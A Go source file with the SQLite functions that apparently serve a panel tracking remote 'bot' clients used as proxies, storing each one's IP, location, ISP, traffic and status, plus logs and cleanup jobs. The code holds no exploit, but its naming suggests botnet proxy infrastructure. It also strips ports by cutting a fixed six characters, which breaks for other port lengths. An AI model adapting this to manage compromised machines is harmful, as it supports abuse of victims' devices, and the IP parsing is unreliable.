package main

import (
	"database/sql"
	"fmt"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

// ProxyStatsDB represents a proxy statistics record in database
type ProxyStatsDB struct {
	ID                int
	BotID             string
	IP                string
	Port              int
	Country           string
	City              string
	ISP               string
	ConnectionsTotal  int
	ConnectionsActive int
	BytesSent         int64
	BytesReceived     int64
	Uptime            int
	Status            string
	LastSeen          int64
	CreatedAt         int64
}

// SaveProxyStats saves or updates proxy statistics in database
func SaveProxyStats(proxy *Proxy) error {
	if proxy == nil || proxy.Client == nil || proxy.Client.Conn == nil {
		return fmt.Errorf("invalid proxy")
	}

	clientAddr := proxy.Client.Conn.RemoteAddr().String()
	ip := clientAddr[:len(clientAddr)-6] // Remove port

	botID := fmt.Sprintf("bot_%d", proxy.Client.CID)
	now := time.Now().Unix()

	status := "idle"
	if proxy.Status == 0x01 {
		status = "running"
	} else if proxy.Status == 0x02 {
		status = "error"
	}

	query := `INSERT INTO proxy_stats 
		(bot_id, ip, port, country, city, isp, connections_total, connections_active, 
		 bytes_sent, bytes_received, uptime, status, last_seen, created_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(bot_id) DO UPDATE SET
		ip = excluded.ip,
		port = excluded.port,
		country = excluded.country,
		city = excluded.city,
		isp = excluded.isp,
		connections_total = excluded.connections_total,
		connections_active = excluded.connections_active,
		bytes_sent = excluded.bytes_sent,
		bytes_received = excluded.bytes_received,
		uptime = excluded.uptime,
		status = excluded.status,
		last_seen = excluded.last_seen`

	_, err := database.Exec(query,
		botID, ip, proxy.Port, proxy.Country, proxy.City, proxy.ISP,
		proxy.Stats.ConnectionsTotal, proxy.Stats.ConnectionsActive,
		proxy.Stats.BytesSent, proxy.Stats.BytesReceived,
		proxy.Stats.Uptime, status, now, now)

	return err
}

// LoadProxyStats loads proxy statistics from database
func LoadProxyStats(botID string) (*ProxyStatsDB, error) {
	query := `SELECT id, bot_id, ip, port, country, city, isp, 
		connections_total, connections_active, bytes_sent, bytes_received,
		uptime, status, last_seen, created_at
		FROM proxy_stats WHERE bot_id = ?`

	var stats ProxyStatsDB
	err := database.QueryRow(query, botID).Scan(
		&stats.ID, &stats.BotID, &stats.IP, &stats.Port,
		&stats.Country, &stats.City, &stats.ISP,
		&stats.ConnectionsTotal, &stats.ConnectionsActive,
		&stats.BytesSent, &stats.BytesReceived,
		&stats.Uptime, &stats.Status,
		&stats.LastSeen, &stats.CreatedAt)

	if err == sql.ErrNoRows {
		return nil, fmt.Errorf("proxy stats not found")
	}

	return &stats, err
}

// GetAllProxyStats returns all proxy statistics from database
func GetAllProxyStats() ([]*ProxyStatsDB, error) {
	query := `SELECT id, bot_id, ip, port, country, city, isp, 
		connections_total, connections_active, bytes_sent, bytes_received,
		uptime, status, last_seen, created_at
		FROM proxy_stats ORDER BY last_seen DESC`

	rows, err := database.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var stats []*ProxyStatsDB
	for rows.Next() {
		var s ProxyStatsDB
		err := rows.Scan(
			&s.ID, &s.BotID, &s.IP, &s.Port,
			&s.Country, &s.City, &s.ISP,
			&s.ConnectionsTotal, &s.ConnectionsActive,
			&s.BytesSent, &s.BytesReceived,
			&s.Uptime, &s.Status,
			&s.LastSeen, &s.CreatedAt)
		if err != nil {
			continue
		}
		stats = append(stats, &s)
	}

	return stats, nil
}

// LogProxyAction logs a proxy action to database
func LogProxyAction(botID, action, details string) error {
	query := `INSERT INTO proxy_logs (bot_id, action, details, timestamp)
		VALUES (?, ?, ?, ?)`

	_, err := database.Exec(query, botID, action, details, time.Now().Unix())
	return err
}

// GetProxyLogs retrieves proxy logs with optional filtering
func GetProxyLogs(botID string, limit int) ([]map[string]interface{}, error) {
	var query string
	var args []interface{}

	if botID != "" {
		query = `SELECT id, bot_id, action, details, timestamp
			FROM proxy_logs WHERE bot_id = ?
			ORDER BY timestamp DESC LIMIT ?`
		args = []interface{}{botID, limit}
	} else {
		query = `SELECT id, bot_id, action, details, timestamp
			FROM proxy_logs
			ORDER BY timestamp DESC LIMIT ?`
		args = []interface{}{limit}
	}

	rows, err := database.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var logs []map[string]interface{}
	for rows.Next() {
		var id int
		var bid, action, details string
		var timestamp int64

		err := rows.Scan(&id, &bid, &action, &details, &timestamp)
		if err != nil {
			continue
		}

		logs = append(logs, map[string]interface{}{
			"id":        id,
			"bot_id":    bid,
			"action":    action,
			"details":   details,
			"timestamp": timestamp,
		})
	}

	return logs, nil
}

// CleanupOldRecords removes old records from database
func CleanupOldRecords() error {
	now := time.Now().Unix()
	thirtyDaysAgo := now - (30 * 24 * 3600)
	sevenDaysAgo := now - (7 * 24 * 3600)

	// Clean old logs (older than 30 days)
	_, err := database.Exec(`DELETE FROM proxy_logs WHERE timestamp < ?`, thirtyDaysAgo)
	if err != nil {
		return err
	}

	// Clean old sessions (older than 7 days)
	_, err = database.Exec(`DELETE FROM proxy_sessions WHERE end_time < ?`, sevenDaysAgo)
	if err != nil {
		return err
	}

	// Mark proxies as offline if not seen in 5 minutes
	fiveMinutesAgo := now - (5 * 60)
	_, err = database.Exec(`UPDATE proxy_stats SET status = 'offline' 
		WHERE last_seen < ? AND status != 'offline'`, fiveMinutesAgo)

	return err
}

// GetProxyStatsByCountry returns proxy count by country
func GetProxyStatsByCountry() (map[string]int, error) {
	query := `SELECT country, COUNT(*) as count 
		FROM proxy_stats 
		WHERE status = 'running' 
		GROUP BY country 
		ORDER BY count DESC`

	rows, err := database.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	stats := make(map[string]int)
	for rows.Next() {
		var country string
		var count int
		if err := rows.Scan(&country, &count); err != nil {
			continue
		}
		stats[country] = count
	}

	return stats, nil
}

// GetProxyUsageStats returns overall usage statistics
func GetProxyUsageStats() (map[string]interface{}, error) {
	query := `SELECT 
		COUNT(*) as total_proxies,
		SUM(CASE WHEN status = 'running' THEN 1 ELSE 0 END) as running_proxies,
		SUM(connections_total) as total_connections,
		SUM(connections_active) as active_connections,
		SUM(bytes_sent) as total_bytes_sent,
		SUM(bytes_received) as total_bytes_received
		FROM proxy_stats`

	var totalProxies, runningProxies, totalConnections, activeConnections int
	var totalBytesSent, totalBytesReceived int64

	err := database.QueryRow(query).Scan(
		&totalProxies, &runningProxies,
		&totalConnections, &activeConnections,
		&totalBytesSent, &totalBytesReceived)

	if err != nil {
		return nil, err
	}

	return map[string]interface{}{
		"total_proxies":       totalProxies,
		"running_proxies":     runningProxies,
		"total_connections":   totalConnections,
		"active_connections":  activeConnections,
		"total_bytes_sent":    totalBytesSent,
		"total_bytes_received": totalBytesReceived,
	}, nil
}

// StartCleanupWorker starts a background worker to clean old records
func StartCleanupWorker() {
	ticker := time.NewTicker(1 * time.Hour)
	go func() {
		for range ticker.C {
			if err := CleanupOldRecords(); err != nil {
				// Log error but don't crash
				fmt.Printf("Cleanup error: %v\n", err)
			}
		}
	}()
}
